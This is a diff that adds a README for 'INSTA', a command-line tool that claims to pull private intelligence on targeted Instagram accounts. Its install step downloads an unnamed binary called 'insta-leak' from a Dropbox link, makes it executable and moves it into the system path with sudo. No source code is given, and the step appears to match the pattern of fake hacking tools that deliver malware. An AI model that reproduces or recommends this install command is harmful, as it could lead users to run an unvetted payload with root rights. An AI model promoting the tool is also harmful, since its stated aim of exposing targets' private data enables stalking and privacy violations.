@@ -1,1 +1,104 @@
-# Insta-private-connections
+# 🚀 INSTA — Private ID Intelligence
+
+<p align="center">
+  <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa3JybjN6eG83MW54dnFkZ2NkM3k0M3h4MW1wdzhvZ3N0M3NxM2J1eSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/l0HlNaQ6gWfllcjDO/giphy.gif" width="700">
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Python-3.x-yellow?style=for-the-badge">
+  <img src="https://img.shields.io/badge/CLI-SciFi-green?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Instagram-Intelligence-red?style=for-the-badge">
+</p>
+
+---
+
+# ⚡ ABOUT
+
+**INSTA** is a futuristic command-line reconnaissance utility for **Private ID Intelligence** with a sleek sci-fi styled interface.
+
+---
+
+# 🧠 FEATURES
+
+* 🎯 Target Instagram accounts directly from CLI
+* ⚡ Fast API-powered intelligence retrieval
+* 🔍 Detects exposed information from Instagram API responses
+* 🛰️ Futuristic sci-fi terminal animations
+* 💻 Lightweight standalone executable binary
+* 🧪 Optimized for Linux environments
+* 🚀 Quick single-command execution
+
+---
+
+# 📦 INSTALLATION
+
+## ⚡ One-Line Install
+
+```bash
+curl -L "https://www.dropbox.com/scl/fi/5qyfyab3854u82v33gdhk/insta-leak?rlkey=0abtulzno0k03e44pb8bdk3oh&st=x44y973j&dl=1" -o insta && chmod +x insta && sudo mv insta /usr/local/bin/insta
+```
+
+---
+
+# 🚀 USAGE
+
+```bash
+insta username
+```
+
+## Example
+
+```bash
+insta target_user
+```
+
+---
+
+# 🛰️ SCREENSHOT
+
+```text
+██╗███╗   ██╗███████╗████████╗ █████╗ 
+██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗
+██║██╔██╗ ██║███████╗   ██║   ███████║
+██║██║╚██╗██║╚════██║   ██║   ██╔══██║
+██║██║ ╚████║███████║   ██║   ██║  ██║
+╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
+
+[+] Connecting to Instagram Node...
+[+] Fetching Intelligence...
+[+] Decrypting Metadata...
+[+] DATA ACQUIRED
+```
+
+---
+
+# ⚠️ DISCLAIMER
+
+This tool is intended strictly for:
+
+* Educational purposes
+* Ethical security research
+* Authorized testing environments
+
+Users are responsible for complying with all applicable laws and platform terms of service.
+
+---
+
+# 👨‍💻 AUTHOR
+
+Developed with ☕ and terminal aesthetics.
+
+> “Recon first. Exploit later.”
+
+---
+
+# ⭐ SUPPORT
+
+If you like the project:
+
+* ⭐ Star the repository
+* 🍴 Fork it
+* 🛰️ Share with researchers
+
+---
